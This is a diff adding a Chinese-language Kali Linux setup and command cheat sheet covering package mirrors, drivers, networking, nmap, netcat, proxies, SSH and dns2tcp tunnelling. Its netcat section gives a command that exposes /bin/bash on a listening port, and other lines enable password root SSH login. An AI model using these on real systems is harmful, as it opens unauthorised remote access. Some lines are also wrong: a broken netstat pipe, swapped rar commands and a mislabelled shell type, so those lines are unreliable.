@@ -1,0 +1,283 @@
+﻿#安装完后续配置
+1.换源
+#一般先安装中科大源
+#修改sources.list
+vim /etc/apt/sources.list
+#添加如下信息
+deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
+deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
+deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free
+deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free
+#然后更新一下（v4.5才有头文件）
+apt-get update（更新索引）
+apt-get upgrade (升级系统上安装的所有软件包；若更新失败，所涉及的包会保持更新之前的状态)
+apt-get dist-upgrade (大版本更新)
+#安装全部工具就继续执行
+apt-get install kali-linux-all
+
+#安装Nvidia显卡驱动
+apt-get update
+apt-get dist-upgrade
+apt-get install -y linux-headers-$(uname -r)
+apt-get install nvidia-kernel-dkms
+sed 's/quiet/quiet nouveau.modeset=0/g' -i /etc/default/grub (设置)
+update-grub （更新设置）
+reboot (重启)
+#验证显卡驱动安装
+glxinfo | grep -i "direct rendering"
+
+2.网络设置
+apt-get install pppoe pppoeconf
+nm-connection-editor(DSL网络在此处添加)
+
+查看防火墙规则：iptables -L
+过滤查看：iptables -t nat -L
+重置防火墙规则：iptables -F
+过滤重置：iptables -t nat -F
+本机端口转发：
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
+
+3.输入法安装
+设置阿里源：deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+#apt-get update
+如出现如下命令（Invalid signature for Kali Linux repositories : “The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository”）
+则执行wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add
+安装
+#apt-get install fcitx fcitx-googlepinyin
+
+
+4.字体安装
+apt-get install ttf-wqy-microhei
+
+5.终端字体调整
+Droid Sans Mono Regular
+
+6.IceWeasel汉化
+sudo apt-get remove iceweasel
+sudo apt-get install iceweasel
+sudo apt-get install iceweasel-l10n-zh-cn
+
+#安装gcc make linux-headers-$(uname-r)
+apt-get install gcc make linux-headers-$(uname -r)
+
+#Kali下压缩解压缩命令大全zip,tar,tar.gz,tar.bz2
+.tar
+解包：tar xvf FileName.tar
+打包：tar cvf FileName.tar DirName
+.gz 
+解压1：gunzip FileName.gz
+解压2：gzip -d FileName.gz
+压缩：gzip FileName
+.tar.gz 
+解压：tar zxvf FileName.tar.gz
+压缩：tar zcvf FileName.tar.gz DirName
+.bz2 
+解压1：bzip2 -d FileName.bz2
+解压2：bunzip2 FileName.bz2
+压缩： bzip2 -z FileName
+.tar.bz2 
+解压：tar jxvf FileName.tar.bz2
+压缩：tar jcvf FileName.tar.bz2 DirName
+.bz
+解压1：bzip2 -d FileName.bz
+解压2：bunzip2 FileName.bz
+.tar.bz
+解压：tar jxvf FileName.tar.bz
+.Z
+解压：uncompress FileName.Z
+压缩：compress FileName
+.tar.Z
+解压：tar Zxvf FileName.tar.Z
+压缩：tar Zcvf FileName.tar.Z DirName
+.tgz
+解压：tar zxvf FileName.tgz
+.tar.tgz
+解压：tar zxvf FileName.tar.tgz
+压缩：tar zcvf FileName.tar.tgz FileName
+.zip
+解压：unzip FileName.zip
+压缩：zip FileName.zip DirName
+.rar
+解压：rar a FileName.rar
+压缩：rar e FileName.rar
+.lha
+解压：lha -e FileName.lha
+压缩：lha -a FileName.lha FileName
+.xz
+1 解压.xz
+xz -d your_file_name.tar.xz
+2 解包.tar
+tar -xvf your_file_name.tar
+
+##如果用VirtualBox虚拟机建议安装增强功能
+#安装VBoxGuestAdditions
+运行kali linux时，在整个屏幕的左上，菜单栏中选择 Devices-Insert Guest Addition CD Image
+#挂载下载完的VBoxGuestAdditions
+mount /dev/cdrom /mnt
+#安装增强器
+cd /mnt
+./VBoxLinuxAdditions.run
+#挂载共享文件夹到kali linux [格式：mount [-参数] [设备名称] [挂载点] 挂载点必须是一个已经存在的目录，这个目录可以不为空，但挂载后这个目录下以前的内容将不可用 umount取消挂载]
+mount -t vboxsf vbox /tmp
+
+#查看网络交互信息
+netstat -pantu | egrep -v '0.0.0.0' | :::' | awk '{print $5}'
+
+#nmap命令
+#扫描tcp端口
+nmap 10.0.1.161  -p1-65535（扫描1-65535端口，不加-p默认扫描1-1024）
+或：nmap  10.0.1.161   -p20-200,7777,8888
+#扫描多个IP用法（nmap 10.0.1.161  10.0.1.162 或 nmap 10.0.1.161,162 或 nmap 10.0.1.161-162）
+#扫描一个子网网段所有IP（nmap 10.0.3.0/24）
+#扫描文件里的IP（nmap -iL ip.txt）
+#扫描地址段是排除某个（些）IP地址（nmap 10.0.1.161-164 --exclude 10.0.1.162,10.0.1.163）
+#扫描多个地址时排除文件里的IP地址（nmap 10.0.1.161-163 --excludefile ex.txt）
+
+#扫描udp端口
+nmap -sU 10.0.1.161 -Pn
+#-sU：表示udp scan ， udp端口扫描。-Pn：不对目标进行ping探测（不判断主机是否在线）（直接扫描端口）
+
+
+#nc命令
+#查看手册：man nc
+#参数
+想要连接到某处: nc [-options] hostname port[s] [ports] …。例(nc 192.168.43.171 80)
+帧听端口等待连接: nc -l port [-options] [hostname] [port]。例(nc -l 80)
+-g<网关>：设置路由器跃程通信网关，最多设置8个;
+-G<指向器数目>：设置来源路由指向器，其数值为4的倍数;
+-h：在线帮助;
+-i<延迟秒数>：设置时间间隔，以便传送信息及扫描通信端口;
+-l：使用监听模式，监控传入的资料;
+-n：直接使用ip地址，而不通过域名服务器;
+-o<输出文件>：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存;
+-p<通信端口>：设置本地主机使用的通信端口;
+-r：指定源端口和目的端口都进行随机的选择;
+-s<来源位址>：设置本地主机送出数据包的IP地址;
+-u：使用UDP传输协议;
+-v：显示指令执行过程;
+-w<超时秒数>：设置等待连线的时间;
+-z：使用0输入/输出模式，只在扫描通信端口时使用。
+
+#多数情况我们不希望连接一直保持，那么我们可以使用 -w 参数来指定连接的空闲超时时间，该参数紧接一个数值，代表秒数，如果连接超过指定时间则连接会被终止。
+nc -w 60 192.168.43.171 2389（注意: 不要在服务器端同时使用 -w 和 -l 参数，因为 -w 参数将在服务器端无效果。）
+#端口扫描
+nc -zvn 192.168.43.171 21-25
+.可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.
+.z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换.
+.v 参数指详细输出.
+.n 参数告诉netcat 不要使用DNS反向查询IP地址的域名.
+.以上命令会打印21到25 所有开放的端口。
+#Chat Server(netcat 命令在20000端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。)
+Server:nc -lp 20000
+Client:nc 192.168.1.1 20000
+#文件传输
+服务器端命令：
+nc -l ip地址 端口号 > 接收的文件名
+客户端命令：
+nc ip地址 端口号 < 发送的文件名
+#反弹shell
+目标服务器：nc -lp 1234 -e /bin/bash
+控制端：nc 192.168.43.171 1234
+
+#kali网卡配置文件
+/etc/network/interfaces
+# 网卡eth0设置为Static类型
+auto eth0
+iface eth0 inet static
+# 指定IP地址、子网掩码、网关
+address 192.168.0.111
+netmask 255.255.255.0
+gateway 192.168.0.1
+#也可以在这里配置dns
+dns-nameservers 114.114.114.114 8.8.8.8
+
+#DNS服务器设置
+配置文件地址: /etc/resolv.conf
+nameserver 192.168.0.1
+
+#重启网卡
+/etc/init.d/networking restart
+
+#查看路由列表
+route -n
+
+#临时IP地址
+dhclient eth0	重新获取IP（有DHCP环境）
+ifconfig eth0 192.168.1.10/24	设置临时IP地址（24代表子网掩码255.255.255.0）
+route add default gw 192.168.1.1	添加临时网关
+
+#请求下载：wget http://。。。
+
+#配置代理
+vi /etc/bash.bashrc
+在最下面添加:
+export ftp_proxy="ftp://user:password@proxyIP:port" (userhe password@可以省略)
+export http_proxy="http://user:password@proxyIP:port"
+export https_proxy="https://user:password@proxyIP:port"
+export socks_proxy="https://user:password@proxyIP:port"
+
+#配置代理链
+vi /etc/proxychains.conf
+使用方法：proxychains curl -v https://www.facebook.com/
+
+#命令行验证HTTP请求
+curl -v http://www.baidu.com
+
+#监听端口
+netstat -pantu | grep :22
+
+#kali linux默认未启动所有网络服务
+#服务脚本文件位置 /etc/init.d/
+#配置默认启动
+update-rc.d ssh defaults 80 20 (80启动优先级 20关闭优先级 数字越低越优先)
+
+#临时开启ssh服务：
+vi /etc/ssh/sshd_config
+设置规则：
+PasswordAuthentication yes
+PermitRootLogin yes
+启动：/etc/init.d/ssh restart
+
+
+#文件查找
+find / -name kali* (/从根查找 .当前目录 -name换成:-iname不区分大小写)
+或者whereis kal*（查找速度快 范围小，查找结果不完整）
+
+#vi详细命令
+touch test 创建二进制文件
+:set nu 显示行号
+i、a、o基本操作
+dd 删除当前行
+yy 复制当前行
+y 复制两行
+p 在下一行粘贴
+
+#修改jdk版本
+update-alternatives --config java
+
+#shell脚本  开头第一行：#!/bin/bash
+
+#ulimit 并发线程限制 
+#ulimit -a 查看线程
+#ulimit -s 100 限制堆栈大小
+#ulimit -m 5000 -v 5000 限制shell内存使用 （m最大内存大小，v虚拟内存大小）
+#ulimit -n 800000 对打开文件数大小限制(linux系统中一切都是文件，运行中的文件叫做进程)
+#vi .bashrc 配置永久生效（在最下面加命令就行）
+
+#kali启动本地默认web应用：service apache2 start	关闭命令：service apache2 stop
+
+#kali漏洞利用向量字典：/usr/share/wfuzz/wordlist/general
+
+#ssh远程连接服务器
+ssh root@192.168.43.144
+
+#kali开启路由功能：sysctl -w net.ipv4.ip_forward=1（或手动修改配置文件/proc/sys/net/ipv4/ip_forward 默认值是0）
+
+#kali配置dns2tcp服务端：
+配置：/etc/dns2tcpd.conf
+启动：dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf
+#-F:前端运行
+#-d:debug level 1-3
+#-f:指定配置文件
+客户端进行连接：dns2tcpc -c -k pass123 -d 1 -l 2222 -r ssh -z kali.test.com
